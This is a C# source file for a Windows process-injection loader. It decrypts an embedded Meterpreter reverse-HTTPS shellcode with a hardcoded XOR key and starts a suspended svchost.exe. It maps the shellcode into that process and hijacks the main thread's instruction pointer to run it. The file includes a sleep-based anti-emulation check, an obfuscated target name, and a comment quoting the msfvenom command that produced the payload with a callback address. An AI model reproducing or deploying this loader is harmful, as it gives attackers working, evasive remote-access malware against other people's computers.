using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Process_Injection___Thread_Hijack_ntdll__Decrypter
{
    class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct THREADENTRY32
        {
            internal UInt32 dwSize;
            internal UInt32 cntUsage;
            internal UInt32 th32ThreadID;
            internal UInt32 th32OwnerProcessID;
            internal UInt32 tpBasePri;
            internal UInt32 tpDeltaPri;
            internal UInt32 dwFlags;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }


        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }


        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }


        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();


        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION
            lpProcessInformation);


        [DllImport("kernel32.dll")]
        static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [DllImport("kernel32.dll")]
        static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);


        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int SuspendThread(IntPtr hThread);


        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
           ref IntPtr section,
           UInt32 desiredAccess,
           IntPtr pAttrs,
           ref long MaxSize,
           uint pageProt,
           uint allocationAttribs,
           IntPtr hFile);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);


        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            string obfuscatedstringname = "exe.tsohcvs\\23metsyS\\swodniW\\:C";

            //string obfuscatedstringname = "exe.replehdof\\23metsyS\\swodniW\\:C";
            string stringname = "";

            /* EVASION 1: Sleep to evade emulation */
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            string key = "Sup3rS3cr3t!"; // good key
            if (t2 < 2)
            {
                key = "NowayNoway!"; // wrong key
            }

            if (key == "NowayNoway!")
            {
                Sleep(1000);
            }
            else
            {
                /*
                Meter payload en shellcode_encrypter.cs

                root@kali:/home/cosmic# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.179 LPORT=443 EXITFUNC=thread -f csharp
                [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
                [-] No arch selected, selecting arch: x64 from the payload
                No encoder specified, outputting raw payload
                Payload size: 601 bytes
                Final size of csharp file: 3085 bytes

                */

                /*
                  PS C:\Users\the_d> "X:\ConsoleApp1\Shellcode Encrypter 1\bin\x64\Release\Shellcode Encrypter 1.exe"
                */
                string base64Encoded = "rz3z14K7/2NyMzVwEiUiYjpi4TUXe/9zMz37YWobuDFSfkXoG3rHeTgbuBEie0Xh/0kRT3B/EyKz+nlgUrSS3iAbuDFSuDYdEiQ4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4+g6KyRl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G221yM3QQakdeAkRrHVJcAkIXUy84urMa9KPJMnQhHkS5YCE5MDA7iSOozLNwM3JTzLaaQnQhU1pBRENjQSgqdh5JPxYoAkM3YzweeSRWOiw3HkVnWhcgRztlIy0GACAEV1IlfjlCKgEhSjwdBSw5XS57PzwAeRsqYg8QSx5COUIFCwM2XTkCUjZzA0RCAR4XazwqXRpIakUqZRkrAgwiAjxnEkdHQEpTe+qzYC5gCzhB+iEbi2NAm/AhU3VwYyEAeqSw2CEPaIqle/uVWWkte/3QOWoqYRrTAGNyev3BOXExajvpRiXstXQhU3WP5j9i8zAoe/3QHkS5fkOaYDA79LYMVW0LzKfW8xZte7Pg22ZwMzvpd5NH03QhU3WP5jqs/Bdw2N7JBnVwMyEKWSMoev3wkpdgerWTM3NyMz2bC9Ej1nJTM2ON5jyyACY4upUbupI6uq5olLVwE3JTeuqLes4zxfySM3JTM5yne/flc/CwR8A1uGQ6MrekkwCia7ELWWMriJQ8eX8xuqis5g==";

                byte[] buf = System.Convert.FromBase64String(base64Encoded);

                /* Meterpreter decryption */
                Console.WriteLine("[+] Decrypting the shellcode");
                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)(((uint)buf[i] ^ key[i % (key.Length)]) & 0xFF);
                }


                //Deobfusate host process name
               for (int i = 0; i < obfuscatedstringname.Length; i++)
                {
                    stringname = stringname + obfuscatedstringname[obfuscatedstringname.Length - i - 1];
                }
                Console.WriteLine("[+] Deobfuscated the host process name: "+stringname);


                // Create the section handle.
                IntPtr ptr_section_handle = IntPtr.Zero;
                long buffer_size = buf.Length;
                UInt32 SECTION_MAP_WRITE = 0x0002;
                UInt32 SECTION_MAP_READ = 0x0004;
                UInt32 SECTION_MAP_EXECUTE = 0x0008;
                UInt32 SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;
                uint PAGE_EXECUTE_READWRITE = 0x40;
                uint SEC_COMMIT = 0x08000000;
                UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, SECTION_ALL_ACCESS, IntPtr.Zero, ref buffer_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
                if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
                {
                    Console.WriteLine("[-] An error occured while creating the section.");
                    return;
                }
                Console.WriteLine("[+] Local section created successfully.");
                Console.WriteLine("[*] Local section handle: 0x" + String.Format("{0:X}", (ptr_section_handle).ToInt64()));


                // Map a view of a section into the virtual address space of the current process.
                long local_section_offset = 0;
                uint PAGE_READWRITE = 0x4;
                IntPtr ptr_local_section_addr = IntPtr.Zero;
                UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, PAGE_READWRITE);
                if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] An error occured while mapping the view within the local section.");
                    return;
                }
                Console.WriteLine("[+] The local section view's been mapped successfully with PAGE_READWRITE access.");
                Console.WriteLine("[*] Local section address: 0x" + String.Format("{0:X}", (ptr_local_section_addr).ToInt64()));

                // Copy the shellcode into the mapped section.
                Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);


                //Run host process
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                bool res = CreateProcess(null, stringname, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
                if (res == false)
                {
                    Console.WriteLine("[-] Host process creation failed");
                    return;
                }
                Console.WriteLine("[*] Host process ID: " + pi.dwProcessId);
                Console.WriteLine("[*] Host Thread ID: " + pi.dwThreadId);


                IntPtr ptr_remote_section_addr = IntPtr.Zero;
                uint PAGE_EXECUTE_READ = 0x20;
                UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, pi.hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, PAGE_EXECUTE_READ);
                if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] An error occured while mapping the view within the remote section.");
                    return;
                }
                Console.WriteLine("[+] The remote section view's been mapped successfully with PAGE_EXECUTE_READ access.");
                Console.WriteLine("[*] Remote section address: 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));




                // Get RIP (only works on 64 bits applications
                CONTEXT64 context = new CONTEXT64();
                context.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
                if (GetThreadContext(pi.hThread, ref context))
                {
                    Console.WriteLine("[*] Original thread Instruction Pointer address (RIP): 0x" + String.Format("{0:X}", (ulong)context.Rip));

                }
                else
                {
                    Console.WriteLine("[-] GetThreadContext failed");
                    return;
                }



                // Unmap the view of the section from the current process & close the handle.
                NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
                NtClose(ptr_section_handle);


                // Set RIP to our shellcode
                context.Rip = (ulong)ptr_remote_section_addr;

                if (SetThreadContext(pi.hThread, ref context))
                {
                    Console.WriteLine("[*] Modified thread Instruction Pointer address (RIP): 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));
                }
                else
                {
                    Console.WriteLine("[-] SetThreadContext failed");
                    return;
                }

                // Resume thread
                Console.WriteLine("[+] Resuming Thread to execute the shellcode...");
                ResumeThread(pi.hThread);
            }
        }
    }
}
